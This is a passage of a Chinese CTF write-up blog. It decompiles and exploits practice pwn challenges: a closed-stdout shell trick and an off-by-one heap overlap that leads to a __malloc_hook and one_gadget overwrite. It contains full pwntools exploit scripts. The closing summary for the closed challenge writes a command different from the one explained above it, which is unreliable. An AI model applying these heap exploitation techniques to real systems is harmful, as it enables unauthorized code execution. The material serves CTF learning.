class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br>mainarena_addr=unsortedbin_addr-<span class="hljs-number">0x58</span><br>malloc_hook=mainarena_addr-<span class="hljs-number">0x10</span><br>libc_base=malloc_hook-libc.symbols[<span class="hljs-string">&quot;__malloc_hook&quot;</span>]<br>free_hook=libc_base+libc.symbols[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;unsorted bin addr=&quot;</span>,<span class="hljs-built_in">hex</span>(unsortedbin_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc_base=&quot;</span>,<span class="hljs-built_in">hex</span>(libc_base))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;free_hook=&quot;</span>,<span class="hljs-built_in">hex</span>(free_hook))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;malloc_hook_addr=&quot;</span>,<span class="hljs-built_in">hex</span>(malloc_hook))<br>exceve_addr=[libc_base+<span class="hljs-number">0x45216</span>,libc_base+<span class="hljs-number">0x4526a</span>,libc_base+<span class="hljs-number">0xf02a4</span>,libc_base+<span class="hljs-number">0xf1147</span>]<br><br>free(<span class="hljs-number">1</span>)<br>fill(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+p64(malloc_hook-<span class="hljs-number">0x23</span>))<br>alloc(<span class="hljs-number">0x60</span>)<br>alloc(<span class="hljs-number">0x60</span>)<br><br>fill(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x13</span>+p64(libc_base+<span class="hljs-number">0x4526a</span>))<br><br>alloc(<span class="hljs-number">0x10</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h1 id="wustctf2020-closed"><a href="#wustctf2020-closed" class="headerlink" title="wustctf2020_closed"></a>wustctf2020_closed</h1><p>从来没见过，所以记录下来</p><h2 id="checksec-3"><a href="#checksec-3" class="headerlink" title="checksec"></a>checksec</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">yyyffff@yyyffff-virtual-machine:~/桌面$</span> <span class="hljs-string">checksec</span> <span class="hljs-string">closed</span><br>[<span class="hljs-string">*</span>] <span class="hljs-string">&#x27;/home/yyyffff/桌面/closed&#x27;</span><br>    <span class="hljs-attr">Arch:</span>       <span class="hljs-string">amd64-64-little</span><br>    <span class="hljs-attr">RELRO:</span>      <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br>    <span class="hljs-attr">Stack:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br>    <span class="hljs-attr">NX:</span>         <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br>    <span class="hljs-attr">PIE:</span>        <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span><br>    <span class="hljs-attr">Stripped:</span>   <span class="hljs-literal">No</span><br></code></pre></td></tr></table></figure><h2 id="IDA-3"><a href="#IDA-3" class="headerlink" title="IDA"></a>IDA</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  init(argc, argv, envp);<br>  vulnerable();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">vulnerable</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;HaHaHa!\nWhat else can you do???&quot;</span>);<br>  close(<span class="hljs-number">1</span>);<br>  close(<span class="hljs-number">2</span>);<br>  <span class="hljs-keyword">return</span> shell();<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">shell</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>问问AI</p><p>在 Linux 中，每个进程维护一个<strong>文件描述符表</strong>：</p><table><thead><tr><th>FD</th><th>含义</th><th>默认指向</th></tr></thead><tbody><tr><td><code>0</code></td><td>标准输入 stdin</td><td>通常是键盘</td></tr><tr><td><code>1</code></td><td>标准输出 stdout</td><td>通常是终端</td></tr><tr><td><code>2</code></td><td>标准错误 stderr</td><td>通常是终端</td></tr></tbody></table><p>这里close(1)，close(2)相当于关掉了标准输出和标准错误，实际上直接执行程序就得到了shell，不过由于关掉了输出，我们在屏幕上无法看到输出了啥，比如说输入ls，实际上有效果只不过输出被关闭了我们看不到而已</p><p>这里用<code>exec 1&gt;&amp;0</code>来使stdout重新指向</p><h3 id="✅-exec"><a href="#✅-exec" class="headerlink" title="✅ exec"></a>✅ <code>exec</code></h3><p>在 shell 中，<code>exec</code> 有两个常见用途：</p><ol><li><p>替换当前进程：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span> /bin/sh<br></code></pre></td></tr></table></figure><p>→ 当前 shell 被 <code>/bin/sh</code> 替代</p></li><li><p><strong>修改当前 shell 的文件描述符</strong>（本题关键）：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">exec</span> <span class="hljs-number">1</span>&gt;&amp;<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>→ 在当前 shell 进程中修改文件描述符指向，不启动新进程。</p></li></ol><hr><h3 id="✅-1-0-是什么格式？"><a href="#✅-1-0-是什么格式？" class="headerlink" title="✅ 1&gt;&amp;0 是什么格式？"></a>✅ <code>1&gt;&amp;0</code> 是什么格式？</h3><p>这是 shell 的<strong>文件描述符重定向语法</strong>：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[目标FD]</span>&gt;<span class="hljs-selector-attr">[&amp;源FD]</span><br></code></pre></td></tr></table></figure><p>具体来说：</p><ul><li><code>1</code>：目标文件描述符，<strong>stdout</strong></li><li><code>&gt;</code>：重定向操作</li><li><code>&amp;0</code>：取文件描述符 0（<strong>stdin</strong>）的底层对象</li></ul><p>👉 表示：</p><blockquote><p>把 <code>fd 1</code>（标准输出）<strong>重定向为</strong> <code>fd 0</code>（标准输入）所连接的<strong>对象</strong>。</p></blockquote><hr><h3 id="📌-图示理解"><a href="#📌-图示理解" class="headerlink" title="📌 图示理解"></a>📌 图示理解</h3><p>假设在运行这个命令前，文件描述符状态如下：</p><table><thead><tr><th>文件描述符</th><th>指向</th></tr></thead><tbody><tr><td><code>0</code> (stdin)</td><td>socket（你的 nc &#x2F; pwntools 连接）</td></tr><tr><td><code>1</code> (stdout)</td><td>已被关闭（<code>close(1)</code>）</td></tr></tbody></table><p>运行 <code>exec 1&gt;&amp;0</code> 后变为：</p><table><thead><tr><th>文件描述符</th><th>指向</th></tr></thead><tbody><tr><td><code>0</code> (stdin)</td><td>socket</td></tr><tr><td><code>1</code> (stdout)</td><td>socket（同 stdin）</td></tr></tbody></table><p>于是你输入的命令，如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> flag<br></code></pre></td></tr></table></figure><p>最终内部调用：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-function"><span class="hljs-title">write</span>(<span class="hljs-params">1, ...</span>)</span>;<br></code></pre></td></tr></table></figure><p>就把 flag 的内容写到了 socket 上，你能在客户端看到输出。</p><hr><h3 id="🔁-为什么是“-0”而不是“0”？"><a href="#🔁-为什么是“-0”而不是“0”？" class="headerlink" title="🔁 为什么是“&amp;0”而不是“0”？"></a>🔁 为什么是“&amp;0”而不是“0”？</h3><ul><li><code>&gt;0</code> 表示重定向到文件 <code>&quot;0&quot;</code>（错误❌）</li><li><code>&gt;&amp;0</code> 表示重定向到<strong>文件描述符编号为 0 的打开通道</strong>（正确✅）</li></ul><p>你也可以做：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">exec</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>→ 把 stderr（fd 2）也重定向到 stdout（fd 1）。</p><hr><h3 id="✅-总结"><a href="#✅-总结" class="headerlink" title="✅ 总结"></a>✅ 总结</h3><table><thead><tr><th>语法元素</th><th>含义</th></tr></thead><tbody><tr><td><code>exec</code></td><td>修改当前 shell 的 FD 表</td></tr><tr><td><code>1</code></td><td>表示标准输出 fd 1</td></tr><tr><td><code>&gt;&amp;0</code></td><td>把它重定向到 fd 0 所指对象</td></tr><tr><td>结果</td><td>输出通过输入通道走回来（可见性恢复）</td></tr></tbody></table><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>直接<code>r.interactive()</code>后输入<code>excv 0&gt;&amp;1</code>即可<code>cat flag</code></p><h1 id="V-N2020-公开赛-simpleHeap"><a href="#V-N2020-公开赛-simpleHeap" class="headerlink" title="[V&amp;N2020 公开赛]simpleHeap"></a>[V&amp;N2020 公开赛]simpleHeap</h1><h2 id="checksec-4"><a href="#checksec-4" class="headerlink" title="checksec"></a>checksec</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss">yyyffff<span class="hljs-keyword">@yyyffff-virtual-machine</span>:~/桌面$ checksec simpleheap<br>[*] <span class="hljs-string">&#x27;/home/yyyffff/桌面/simpleheap&#x27;</span><br>    <span class="hljs-attribute">Arch</span>:       amd64-<span class="hljs-number">64</span>-little<br>    <span class="hljs-attribute">RELRO</span>:      Full RELRO<br>    <span class="hljs-attribute">Stack</span>:      Canary found<br>    <span class="hljs-attribute">NX</span>:         NX enabled<br>    <span class="hljs-attribute">PIE</span>:        PIE enabled<br></code></pre></td></tr></table></figure><h2 id="IDA-4"><a href="#IDA-4" class="headerlink" title="IDA"></a>IDA</h2><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __noreturn <span class="hljs-title function_">sub_F0A</span><span class="hljs-params">()</span><br>&#123;<br>  sub_A39();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to V&amp;N challange!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This&#x27;s a simple heap for you.&quot;</span>);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    sub_EB6();<br>    <span class="hljs-keyword">switch</span> ( sub_9EA() )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        sub_AFF();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        sub_CBB();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        sub_D6F();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        sub_DF7();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please input current choice.&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>一道菜单题</p><h3 id="menu"><a href="#menu" class="headerlink" title="menu"></a>menu</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sub_EB6</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1.Add&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2.Edit&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3.Show&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;4.Delete&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;5.Exit&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;choice: &quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sub_AFF</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  v1 = sub_AB2();<br>  <span class="hljs-keyword">if</span> ( v1 == <span class="hljs-number">-1</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Full&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;size?&quot;</span>);<br>  result = sub_9EA();<br>  v2 = result;<br>  <span class="hljs-keyword">if</span> ( result &gt; <span class="hljs-number">0</span> &amp;&amp; result &lt;= <span class="hljs-number">111</span> )<br>  &#123;<br>    qword_2020A0[v1] = <span class="hljs-built_in">malloc</span>(result);<br>    <span class="hljs-keyword">if</span> ( !qword_2020A0[v1] )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Something Wrong!&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    dword_202060[v1] = v2;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;content:&quot;</span>);<br>    read(<span class="hljs-number">0</span>, (<span class="hljs-type">void</span> *)qword_2020A0[v1], dword_202060[v1]);<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Done!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到 qword_2020A0 存储的是堆块指针，doword_202060 存储的是大小</p><p>if 语句限制了堆块大小要&lt;111，所以无法直接 malloc unsortedbin 范围内堆块</p><h3 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sub_CBB</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;idx?&quot;</span>);<br>  v1 = sub_9EA();<br>  <span class="hljs-keyword">if</span> ( v1 &gt; <span class="hljs-number">9</span> || !qword_2020A0[v1] )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;content:&quot;</span>);<br>  sub_C39(qword_2020A0[v1], dword_202060[v1]);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Done!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>sub_C39是自己写的输入函数</p><h3 id="sub-C39（自定义的输入函数）"><a href="#sub-C39（自定义的输入函数）" class="headerlink" title="sub_C39（自定义的输入函数）"></a>sub_C39（自定义的输入函数）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">sub_C39</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">int</span> a2)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int64 result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; ; ++i )<br>  &#123;<br>    result = i;<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)i &gt; a2 )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( !read(<span class="hljs-number">0</span>, (<span class="hljs-type">void</span> *)((<span class="hljs-type">int</span>)i + a1), <span class="hljs-number">1uLL</span>) )<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> ( *(_BYTE *)((<span class="hljs-type">int</span>)i + a1) == <span class="hljs-number">10</span> )<br>    &#123;<br>      result = (<span class="hljs-type">int</span>)i + a1;<br>      *(_BYTE *)result = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">return</span> result;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到循环时从 0 到 a2 ，多循环了一次，有 <strong>off-by-one</strong> 漏洞，可以修改下个堆块的 size</p><h3 id="view"><a href="#view" class="headerlink" title="view"></a>view</h3><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c#"><span class="hljs-function"><span class="hljs-built_in">int</span> <span class="hljs-title">sub_D6F</span>()</span><br>&#123;<br>  signed <span class="hljs-built_in">int</span> v1; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  printf(<span class="hljs-string">&quot;idx?&quot;</span>);<br>  v1 = sub_9EA();<br>  <span class="hljs-keyword">if</span> ( (unsigned <span class="hljs-built_in">int</span>)v1 &gt; <span class="hljs-number">9</span> || !*((_QWORD *)&amp;qword_2020A0 + v1) )<br>    exit(<span class="hljs-number">0</span>);<br>  puts(*((<span class="hljs-keyword">const</span> <span class="hljs-built_in">char</span> **)&amp;qword_2020A0 + v1));<br>  <span class="hljs-keyword">return</span> puts(<span class="hljs-string">&quot;Done!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>查看堆块内容</p><h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sub_DF7</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;idx?&quot;</span>);<br>  v1 = sub_9EA();<br>  <span class="hljs-keyword">if</span> ( v1 &gt; <span class="hljs-number">9</span> || !qword_2020A0[v1] )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">free</span>((<span class="hljs-type">void</span> *)qword_2020A0[v1]);<br>  qword_2020A0[v1] = <span class="hljs-number">0LL</span>;<br>  dword_202060[v1] = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Done!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>释放后全置0了，貌似不存在啥漏洞</p><h2 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h2><ul><li>首先创 4 个堆块，利用第一个堆块修改第二个堆块的 size （修改为实际上 1 2 块加起来的大小（0x70+0x70））使其释放后进入 unsortedbin，然后释放 1 块，这样就让 1 进入unsortedbin 然后再申请 0x60 的块，剩下的堆块就会与 2 块重叠，这样 2 块的 fd bk 就是 &amp;unsortedbin ，而后 view(2) 即可得到 libcbase</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x18</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>) <span class="hljs-comment"># 0</span><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>) <span class="hljs-comment"># 1</span><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>) <span class="hljs-comment"># 2</span><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>) <span class="hljs-comment"># 3</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x18</span>+<span class="hljs-string">b&#x27;\xe1&#x27;</span>)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>) <span class="hljs-comment"># 1</span><br>view(<span class="hljs-number">2</span>)<br>unsortedbin=u64(r.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase=unsortedbin-<span class="hljs-number">88</span>-<span class="hljs-number">0x3c4b20</span><br>malloc_hook=libcbase+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>realloc_addr=libcbase+libc.sym[<span class="hljs-string">&#x27;realloc&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;__malloc_hook-&gt;&quot;</span>,<span class="hljs-built_in">hex</span>(malloc_hook))<br></code></pre></td></tr></table></figure><ul><li>然后再次申请 0x60 的块得到 4 块，此时 4 块 2 块是同一块地址，我们可以释放 4 块，再利用 2 块修改 fd 为 __malloc_hook-0x23 ，再申请两次，就可以得到 __malloc_hook-0x23 处堆块，然后利用 realloc 调整栈帧打 one_gadget 即可</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>) <span class="hljs-comment"># 4 但是跟#2是同一块地址</span><br><br>delete(<span class="hljs-number">4</span>)<br>edit(<span class="hljs-number">2</span>,p64(malloc_hook-<span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>ogg=[<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xb</span>+p64(libcbase+ogg[<span class="hljs-number">1</span>])+p64(realloc_addr+<span class="hljs-number">12</span>))<br><br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./simpleheap&#x27;</span>)<br>libc=ELF(<span 